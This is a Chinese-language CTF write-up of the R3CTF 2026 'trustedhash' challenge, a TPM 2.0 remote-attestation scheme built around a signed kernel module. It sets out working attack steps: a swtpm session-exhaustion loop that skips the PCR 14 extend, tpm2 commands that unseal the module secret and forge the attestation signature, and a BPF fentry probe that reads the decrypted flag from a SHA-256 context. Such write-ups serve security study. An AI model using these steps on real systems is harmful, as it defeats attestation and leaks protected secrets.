# trustedhash

## 题目简述

题目给出一台由选手完全控制的 Linux 虚拟机，选手拥有 root、SSH 与 VNC 权限；真正不受选手控制的是远端 attester。虚拟机内运行 `trusted-hash-agent`，它只负责把网络请求转发给 `/dev/trusted_hash`，核心逻辑位于签名内核模块 `trusted_hash.ko` 和 swtpm 提供的 TPM 2.0 状态中。

正常证明流程如下：

1. attester 发送随机 challenge 和 PCR mask。
2. 内核模块读取 PCR，创建 AK 与临时 RSA 解密密钥，并返回 EK 证书、密钥公有区、PCR 摘要、密钥创建证明和模块签名。
3. attester 校验 EK、PCR、AK、解密密钥的创建证明，以及固定 `module_signer` 对整段 transcript 的签名。
4. 验证通过后，attester 用临时 RSA 公钥加密本队动态 flag。
5. 内核模块在 TPM 内解密 flag，只把 `SHA-256(flag)` 返回给 attester。

两个持久对象决定了信任根：

```text
0x81010020  module_signer：给证明 transcript 签名
0x81010021  module_secret：module_signer 的授权值，受 PCR policy 封装
```

默认 PCR 集合为 $\{0,2,4,7,11,14\}$。模块每次成功恢复 `module_secret` 后都会扩展 PCR 14，使同一 policy 不能在普通运行状态下再次满足。因此题目虽然也涉及内核与取证，决定性机制是 TPM、PCR 和 Secure Boot 组成的启动信任链，归入 `hardware-embedded` 更准确。

## 解题过程

### 还原证明协议

`trusted_hash_attester/src/flow.rs` 表明 attester 只有在 `create_session -> verify -> activate -> trusted_hash` 全部成功后才发送 flag。最后一步会把环境变量 `CTF_FLAG` 加密到客户端声明的解密公钥：

```rust
let encrypted_blob =
    encrypt_with_decrypt_key(&self.evidence.decrypt_key_public, flag.as_bytes())?;
write_request(
    stream,
    &Request::TrustedHash(TrustedHashRequest {
        session_id: self.evidence.session_id,
        encrypted_blob,
    }),
)?;
```

模块签名覆盖的 transcript 不能任意删改，其顺序为：

```text
label || challenge || pcr_mask || pcr_digest || policy_digest ||
ak_name || decrypt_key_name || ak_public || decrypt_key_public ||
certify_info || certify_signature || module_signer_name
```

attester 还会检查：

- EK 证书是否属于部署时记录的 EK；
- `ak_name` 是否与 `ak_public` 匹配；
- AK 是否验证了解密密钥的 `certify_info`；
- 解密密钥的 policy 是否由提交的 PCR 摘要正确计算；
- `module_signer_name` 是否等于部署时记录的基线；
- `module_signer` 的 RSA-SHA256 签名是否覆盖当前 challenge 和全部上述字段。

所以只在用户态伪造 JSON 不够，至少还要控制一把能通过 AK 证明的解密密钥，并取得固定 `module_signer` 的签名能力。

### 漏洞一：模块初始化失败时没有扩展 PCR 14

已有持久对象时，`trusted_hash_kmod/cmd.c` 的初始化路径先启动 policy session、按当前 PCR 解封 `module_secret`，成功后才跳到 `extend_pcr`：

```c
rc = tpm2_start_policy_session(tpm, &policy_session, NULL, 0, NULL);
if (rc) {
    pr_err("%s: Failed to start module signer policy session: %d\n",
           log_prefix, rc);
    goto out_put_tpm;
}

rc = tpm2_unseal(tpm, TRUSTED_HASH_MODULE_SECRET_HANDLE,
                 policy_session, module_signer_auth,
                 sizeof(module_signer_auth), &private_size);
if (rc)
    goto out_flush_policy;

goto extend_pcr;

extend_pcr:
sha256_init(&ctx);
sha256_update(&ctx, TRUSTED_HASH_MODULE_PCR_DIGEST,
              sizeof(TRUSTED_HASH_MODULE_PCR_DIGEST) - 1);
sha256_final(&ctx, pcr_digest);
rc = tpm2_pcr_extend_sha256(
    tpm, TRUSTED_HASH_MODULE_SIGNER_PCR, pcr_digest
);
```

这里的错误路径是关键：若 `tpm2_start_policy_session` 失败，函数直接返回，PCR 14 不会被扩展，而系统仍可继续启动。

swtpm 对 saved session 的数量有限，并把这些 session 保存在可跨重启恢复的状态中。先卸载模块，避免退出清理逻辑回收 TPM 句柄，再填满 session 槽：

```bash
rmmod trusted_hash

for i in $(seq 1 100); do
    tpm2_startauthsession \
        --policy-session \
        -S "/tmp/session-spam-$i.ctx"
done
```

接着应使用题目控制面提供的“Restart VM”，而不是只在 guest 内执行 `reboot`。前者会重新启动 QEMU/swtpm，使启动 PCR 回到新一轮启动状态，同时 saved session 压力仍从持久状态恢复。模块加载时无法再创建 policy session，于是日志中出现：

```text
trusted_hash:cmd.c: Failed to start module signer policy session: -5
```

此时再释放占满的 session：

```bash
tpm2_flushcontext --saved-session
```

检查 PCR 14 应仍为全零。然后按模块使用的同一 PCR 集合建立 policy session：

```bash
tpm2_pcrread \
    -o "/tmp/pcr-values.bin" \
    "sha256:0,2,4,7,11,14"

tpm2_createpolicy \
    --policy-pcr \
    -l "sha256:0,2,4,7,11,14" \
    -f "/tmp/pcr-values.bin" \
    -L "/tmp/policy.digest"

tpm2_startauthsession \
    --policy-session \
    -S "/tmp/unseal.ctx"

tpm2_policypcr \
    -S "/tmp/unseal.ctx" \
    -l "sha256:0,2,4,7,11,14" \
    -f "/tmp/pcr-values.bin" \
    -L "/tmp/policy.digest"

tpm2_unseal \
    -c 0x81010021 \
    -p "session:/tmp/unseal.ctx" \
    -o "/tmp/module-secret"
```

可用 `tpm2_readpublic -c 0x81010021` 输出的 `authorization policy` 与 `/tmp/policy.digest` 交叉验证。取得的 32 字节 `module_secret` 就是持久 `module_signer` 的授权值：

```bash
printf 'test' > "/tmp/message"
tpm2_sign \
    -c 0x81010020 \
    -p "file:/tmp/module-secret" \
    -g sha256 \
    -o "/tmp/signature" \
    "/tmp/message"
```

### 漏洞二：AK 没有授权保护

`create_session` 创建 AK 时没有传入独立 auth；attester 的验证代码反而明确要求 AK 的 `authPolicy` 为空。AK 在 session 生命周期内又保持为 TPM 对象，因此 root 可以让这把 AK 为自建的 RSA 解密密钥生成合法的 `CertifyCreation`。

至此可以停止原 `trusted-hash-agent`，由替代服务完成以下流程：

1. 接收 attester 的 challenge。
2. 在同一 TPM 下创建选手掌握授权值的 RSA 解密密钥。
3. 用无授权 AK 对该密钥的创建信息签名。
4. 按源码顺序拼出 transcript。
5. 用 `0x81010020` 和已解封的 `/tmp/module-secret` 对 transcript 签名。
6. 返回完整 `CreateSessionResponse`，再完成 credential activation。
7. attester 会把动态 flag 加密给选手控制的 RSA 密钥；替代服务直接解密并输出明文，而不是只返回哈希。

公开复现记录给出了上述 session-exhaustion 路线的完整 TPM 操作和成功 flag 样例；必要的协议字段、PCR 集合、句柄与错误路径已经在本文展开，原文仅作为来源保留：[R3CTF 2026 — trustedhash](https://blog.kelte.cc/posts/r3ctf-2026-trustedhash/)。

### 更直接的非预期路线：观察 SHA-256 上下文

源码还暴露了另一条更短的路径。TPM 解密后的 flag 不只存在于随后被清理的 `plaintext` 中，还会被复制到内核栈上的 `struct sha256_ctx`：

```c
rc = tpm2_rsa_decrypt(
    tpm, sess->decrypt_key_handle,
    decrypt_name, decrypt_name_size,
    policy_session,
    policy_nonce_tpm, policy_nonce_tpm_size,
    sess->key_auth, sizeof(sess->key_auth),
    req->encrypted_blob, req->encrypted_blob_size,
    plaintext, TRUSTED_HASH_ENCRYPTED_BLOB_MAX_SIZE,
    &plaintext_size
);

sha256_init(&hash_ctx);
sha256_update(&hash_ctx, plaintext, plaintext_size);
sha256_final(&hash_ctx, req->result);
```

flag 短于一个 SHA-256 分组。调用 `sha256_final()` 前，尚未填满的原文仍位于 `hash_ctx` 的 64 字节缓冲区。生产环境的 kernel lockdown 阻止了未签名模块、`/dev/mem`、`/proc/kcore` 和普通的任意内核读取，但 BTF 为 `sha256_final(struct sha256_ctx *, u8 *)` 提供了类型信息，BPF fentry 可以直接取得这个函数参数。

核心探针可概括为：

```c
SEC("fentry/sha256_final")
int BPF_PROG(capture_sha256_ctx, struct sha256_ctx *ctx, u8 *out)
{
    captured = *ctx;
    return 0;
}
```

在缺少 `bpftool`/libbpf 的题目环境中，可用原始 `bpf()` 系统调用加载程序并把 `captured` 写入 map。等待 attester 的周期请求后，轮询 map；过滤含 `r3ctf{` 的缓冲区即可取得本队 flag。公开记录中的一次捕获为：

```text
count=56
ascii=r3ctf{TH3_V3rif1Er-owNs-thE_TruST-BUt_YOu_Own_The-r4m79}
```

这一数值只属于对应队伍。仓库部署逻辑通过 `FLAG`/`CTF_FLAG` 注入每队动态 flag，因此另一份公开题解得到不同 flag 并不矛盾。BPF 路线的原始记录见 [TrustedHash Writeup](https://github.com/hax1ng/r3ctf-2026-writeups/blob/main/pwn/TrustedHash.md)。

### 预期路线与验证边界

题目作者事后确认预期解是 hot-boot forensics：在重启边界保留并转储 RAM，再从旧内存中搜索 `module_secret`。flag 文本中的 `ram` 也提示了这条路线。但当前仓库没有官方内存转储脚本或完整预期解法，本文不补写未经验证的具体抓取步骤；可复现主线采用上面的 swtpm 会话耗尽攻击，BPF fentry 作为源码支持的另一条已成功路线。

## 方法总结

- 信任证明的安全性取决于整条生命周期，而不只取决于密码算法。TPM session 耗尽使初始化在扩展 PCR 前失败，破坏了“解封一次后立即棘轮”的状态机假设。
- AK、解密密钥和 `module_signer` 各自承担不同绑定责任。无授权 AK 允许伪造密钥创建证明；解封 `module_secret` 则补齐固定信任根对 transcript 的签名。
- secret 离开 TPM 后的每个副本都应视为攻击面。即使原始明文被擦除，SHA-256 上下文、栈帧、日志或 DMA 缓冲中的副本仍可能泄漏。
- 本题 flag 按队伍动态注入，公开题解中的不同 flag 都只能作为各自成功执行的证据，不能硬编码成通用答案。
